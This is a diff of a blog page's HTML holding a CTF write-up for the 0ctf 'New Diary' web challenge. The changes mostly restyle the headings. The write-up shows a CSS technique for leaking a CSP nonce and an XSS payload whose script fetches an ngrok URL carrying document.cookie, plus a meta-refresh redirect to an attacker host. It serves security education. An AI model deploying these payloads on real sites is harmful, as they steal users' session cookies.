@@ -94,7 +94,11 @@
 
       <div class="content"><p>This year, for the first time, I partecipated to <strong>0ctf</strong> with <code>mhackeroni</code>.
 Me, <code>@Ricy</code> and <code>@Alemmi</code> solved this challenge, we spent many hours in order to find a working exploit, but it was worth it.</p>
-<h2 id="index">Index</h2>
+<h2 id="index">
+  <a class="full-clickable-heading" href="#index">
+    Index
+  </a>
+</h2>
 <ul>
 <li><a href="#new-diary-14-solves">New Diary (14 solves)</a>
 <ul>
@@ -114,7 +118,12 @@ Me, <code>@Ricy</code> and <code>@Alemmi</code> solved this challenge, we spent 
 </ul>
 </li>
 </ul>
-<h2 id="overview">Overview</h2>
+
+<h2 id="overview">
+  <a class="full-clickable-heading" href="#overview">
+    Overview
+  </a>
+</h2>
 <p>This is a whitebox web challenge and it&rsquo;s client-side, we need to steal the admin cookie with the flag inside, so we have to do XSS.
 We&rsquo;re able to:</p>
 <ul>
@@ -178,7 +187,12 @@ Of course not, if we read more carefully <code>read_share.html</code> we notice 
 <p>However, due to the <code>unsafe-inline</code> CSP policy, we&rsquo;re able to insert CSS by using the <code>&lt;style&gt;</code> tag and by uploading to <code>npm</code> (the files are taken by <code>unpkg.com</code>)</p>
 <p>By doing a quick research it&rsquo;s clear that we need to steal the nonce using CSS.</p>
 <p><strong>Note:</strong> It&rsquo;s possible to leak the nonce using CSS because it&rsquo;s inside a meta tag, otherwise it wouldn&rsquo;t be possibile.</p>
-<h2 id="exploit-idea">Exploit idea</h2>
+
+<h2 id="exploit-idea">
+  <a class="full-clickable-heading" href="#exploit-idea">
+    Exploit idea
+  </a>
+</h2>
 <p>The exploit would be something similar to:</p>
 <ol>
 <li>Upload to <code>npm</code> a css file <code>leak.css</code> whose content is the exploit which will leak the nonce (I&rsquo;m going to talk about this later).</li>
@@ -189,7 +203,12 @@ Of course not, if we read more carefully <code>read_share.html</code> we notice 
 <li>Profit.</li>
 </ol>
 <p>Main issue is, though, to understand how to leak the nonce.</p>
-<h2 id="leaking-the-nonce">Leaking the nonce</h2>
+
+<h2 id="leaking-the-nonce">
+  <a class="full-clickable-heading" href="#leaking-the-nonce">
+    Leaking the nonce
+  </a>
+</h2>
 <p>The first idea that came into our mind is using the following css rules in order to leak the nonce:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">body</span>:<span style="color:#a6e22e">has</span><span style="color:#f92672">(</span><span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">])</span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">background</span>: url(<span style="color:#e6db74">...</span>)
@@ -310,8 +329,18 @@ It&rsquo;s possible to recover the nonce in many ways, the one we used is the fo
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> nonce
 </span></span></code></pre></div><p>We noticed that the tab crashes while loading that css, but the requests are sent to our server anyway.</p>
-<h2 id="sources">Sources</h2>
-<h3 id="css-exploit">CSS exploit</h3>
+
+<h2 id="sources">
+  <a class="full-clickable-heading" href="#sources">
+    Sources
+  </a>
+</h2>
+
+<h3 id="css-exploit">
+  <a class="full-clickable-heading" href="#css-exploit">
+    CSS exploit
+  </a>
+</h3>
 <p>This is the script used in order to generate the CSS file:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> itertools
 </span></span><span style="display:flex;"><span>
@@ -338,16 +367,36 @@ It&rsquo;s possible to recover the nonce in many ways, the one we used is the fo
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">background: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> data[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
-</span></span></code></pre></div><h3 id="first-note-id-0">First note (ID 0)</h3>
+</span></span></code></pre></div>
+<h3 id="first-note-id-0">
+  <a class="full-clickable-heading" href="#first-note-id-0">
+    First note (ID 0)
+  </a>
+</h3>
 <p>Meta tag redirect</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0;url=https://25de-37-160-34-111.ngrok-free.app/&#34;</span>&gt;
-</span></span></code></pre></div><h3 id="second-note-id-1">Second Note (ID 1)</h3>
+</span></span></code></pre></div>
+<h3 id="second-note-id-1">
+  <a class="full-clickable-heading" href="#second-note-id-1">
+    Second Note (ID 1)
+  </a>
+</h3>
 <p>Nonce leak</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/alemmi@x.x.x/leak.css&#34;</span>&gt;&lt;<span style="color:#f92672">input</span> /&gt;
-</span></span></code></pre></div><h3 id="third-note-id-2">Third Note (ID 2)</h3>
+</span></span></code></pre></div>
+<h3 id="third-note-id-2">
+  <a class="full-clickable-heading" href="#third-note-id-2">
+    Third Note (ID 2)
+  </a>
+</h3>
 <p>XSS</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">asdasd</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;script nonce=&#34;{nonce}&#34;&gt;fetch(&#34;{ngrok_url}/flag?flag=&#34;+encodeURI(document.cookie))&lt;/script&gt;&#39;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
-</span></span></code></pre></div><h3 id="final-exploit">Final exploit</h3>
+</span></span></code></pre></div>
+<h3 id="final-exploit">
+  <a class="full-clickable-heading" href="#final-exploit">
+    Final exploit
+  </a>
+</h3>
 <p>Just go to <code>/exploit</code> and everything will be automatically done. Obviously, you need to open a ngrok http tunnel to a port, and open the python server to the same port. Furthermore, the leak.css file should have the ngrok url as well.</p>
 <p><code>server.py</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
